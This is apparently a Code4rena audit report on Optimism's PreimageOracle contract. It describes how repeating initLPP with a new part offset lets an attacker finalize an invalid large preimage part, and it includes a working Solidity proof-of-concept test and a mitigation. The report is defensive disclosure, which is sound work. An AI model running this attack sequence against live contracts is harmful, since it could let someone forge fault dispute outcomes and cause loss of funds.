# #14: An attacker can finalize invalid LPPs by repeating `initLPP` call with different `_partOffset`
Labels: ['bug', '3 (High Risk)', 'satisfactory', 'sponsor confirmed', 'sufficient quality report', ':robot:_13_group', 'duplicate-27']
Accepted: True

# Lines of code

https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L687-L688


# Vulnerability details

Large preimage proposals (LPP) allow submitters to prove that certain data is a fixed part of the large preimage that produces a specific Keccak-256 hash value. Since the preimage is large, the process of LPP finalization involves multiple transactions. Because the intermediate steps are not verified on-chain, LPP requires a challenge period during which challengers can verify the correctness of the LPP and dispute it on-chain via the `challengeLPP` and `challengeFirstLPP` functions.

The issue arises from the fact that the current implementation of `initLPP` does not check whether the proposal has already been initialized. The Spearbit report describes the impact of this issue as a potential loss of funds due to user error, as detailed in issue 5.2.5. However, the potential impact of this issue is far more severe. The impact described in issue 5.2.5 can safely be ignored as it doesn't affect protocol safety, whereas the impact described here cannot be ignored. Since these issues require completely different levels of caution from the Optimism team, I believe this issue cannot be considered a duplicate of 5.2.5.

The main observation that leads to the attack is that the `squeezeLPP` function assumes that `metaData.partOffset()` is the same offset as the one used during the `addLeavesLPP` calls. However, this assumption can be violated by repeating the `initLPP` call with a new `_partOffset` after the challenge period but before the `squeezeLPP` call. This will require an attacker to burn the previous bond. By doing this, a malicious submitter can finalize an invalid proposal, as the `proposalParts` will contain a part with the old offset.
```solidity
uint256 partOffset = metaData.partOffset();
preimagePartOk[finalDigest][partOffset] = true;
preimageParts[finalDigest][partOffset] = proposalParts[_claimant][_uuid];
```
I want to emphasize that the initial LPP is perfectly valid and cannot be challenged. The finalized part in `preimageParts` will still be part of the preimage, but the offset of this part will be incorrect. Which essentially makes the finalized preimage part invalid.
 
The full attack is demonstrated in the POC below.

## Impact
This issue demonstrates that the malicious submitter can finalize an invalid LPP preimage part by repeating `initLPP` call with a different `_partOffset`. Since this data is assumed to be correct and is used in the `MIPS.sol`, this attack allows a malicious submitter to successfully challenge valid claims and forge invalid claims that cannot be challenged. In summary, the attack has no preconditions, can be executed by anyone, and completely breaks the fault dispute game logic. That's why I believe the severity is HIGH.

## Proof of Concept
```solidity
contract PreimageOracle_LargePreimageProposals_Test is Test {
    ...
    function test_squeeze_challengePeriodPassed_repeat_init() public {
        // Allocate the preimage data.
        bytes memory data = new bytes(136);
        for (uint256 i; i < data.length; i++) {
            // 00 01 02 03 04 ...
            data[i] = bytes1(uint8(i));
        }

        // Initialize the proposal.
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));

        // Add the leaves to the tree (2 keccak blocks.)
        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
        oracle.addLeavesLPP(TEST_UUID, 0, data, stateCommitments, true);

        // Construct the leaf preimage data for the blocks added.
        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, data);

        // Create a proof array with 16 elements.
        bytes32[] memory preProof = new bytes32[](16);
        preProof[0] = _hashLeaf(leaves[1]);
        bytes32[] memory postProof = new bytes32[](16);
        postProof[0] = _hashLeaf(leaves[0]);
        for (uint256 i = 1; i < preProof.length; i++) {
            bytes32 zeroHash = oracle.zeroHashes(i);
            preProof[i] = zeroHash;
            postProof[i] = zeroHash;
        }

        //! LPP can't be challenged because it is valid
        vm.warp(block.timestamp + oracle.challengePeriod() + 1 seconds);

        //! The attacker repeats the initLPP call with the different offset.
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 20, uint32(data.length));

        // Finalize the proposal.
        uint256 balanceBefore = address(this).balance;
        oracle.squeezeLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
            _preState: leaves[0],
            _preStateProof: preProof,
            _postState: leaves[1],
            _postStateProof: postProof
        });
        assertEq(address(this).balance, balanceBefore + oracle.MIN_BOND_SIZE());
        assertEq(oracle.proposalBonds(address(this), TEST_UUID), 0);

        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
        //! This value is correct for offset 0 but not for offset 20.
        //! The correct value for offset 20 is:  0x0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b
        bytes32 partWithOffset0 = 0x0000000000000088000102030405060708090a0b0c0d0e0f1011121314151617;
        //! An invalid LPP is finalized and can be used in the MIPS.sol
        assertTrue(oracle.preimagePartOk(finalDigest, 20));
        assertEq(oracle.preimageLengths(finalDigest), data.length);
        assertEq(oracle.preimageParts(finalDigest, 20), partWithOffset0);
    }
    ...
}
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
Consider prohibiting repeated `initLPP` calls:
```solidity
if (metaData.claimedSize() != 0) revert ProposalAlreadyExists();
```


## Assessed type

Invalid Validation